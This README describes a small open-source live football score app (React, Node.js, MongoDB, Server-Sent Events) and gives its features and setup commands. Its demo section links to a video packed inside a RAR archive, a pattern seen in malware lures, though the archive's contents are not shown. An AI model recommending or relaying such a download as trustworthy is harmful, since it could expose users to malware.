# ⚽ Live Football Score Management App

[![GitHub stars](https://img.shields.io/github/stars/Chala751/Live-Football-Scores?style=social)](https://github.com/Chala751/Live-Football-Scores/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/Chala751/Live-Football-Scores?style=social)](https://github.com/Chala751/Live-Football-Scores/network/members)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A lightweight, real-time football score management system.

Admins can create matches, update scores, and mark matches as finished. Powered by **React, Node.js, MongoDB, and SSE**.

---

## 🚀 Features
* **Create Matches:** Home Team vs Away Team
* **Update Scores:** Live game score updates
* **Prevent Negative Scores**
* **Finish Matches:** Mark matches as finished
* **Real-Time Updates:** Automatic refresh via **Server-Sent Events (SSE)**

---

## 💻 Installation & Setup (Copy-Paste)

1.  **Clone the Repository:**
    ```bash
    git clone [https://github.com/Chala751/Live-Football-Scores.git](https://github.com/Chala751/Live-Football-Scores.git)
    cd Live-Football-Scores
    ```

2.  **Backend Setup:**
    ```bash
    # Install dependencies and create .env
    cd server
    npm install
    echo "MONGO_URI=your_mongodb_connection_string\nPORT=5000" > .env
    
    # Start the server
    npm run server
    ```

3.  **Frontend Setup:**
    ```bash
    # Install dependencies and start client
    cd ../client
    npm install
    npm run dev
    ```

> The Frontend will be running at **http://localhost:5173** and the API server at **http://localhost:5000**.

---

## 📂 Project Structure
live-football-scores/ │── server/ # Node.js + Express + MongoDB (API + SSE) │── client/ # React + React Router + SSE │── README.md # Project documentation 

---

## 🛠️ Tech Stack
* **Frontend:** React + React Router DOM + SSE + CSS
* **Backend:** Node.js + Express
* **Database:** MongoDB + Mongoose
* **Realtime Updates:** Server-Sent Events (SSE)

---

## 🎥 Demo

[📥 Download Demo Video (2MB RAR Archive)](https://github.com/Chala751/Live-Football-Scores/releases/tag/demo-v1.0/demo.for.live.football.rar)

*This file contains a 58-second video demonstration of the app.*

---

## ⭐ Future Improvements
* Admin authentication & roles
* Match schedule & countdown timer
* Team logos & enhanced UI
* Player stats & history
* Notifications for score updates

---

## 📜 License
This project is licensed under the **MIT License**.
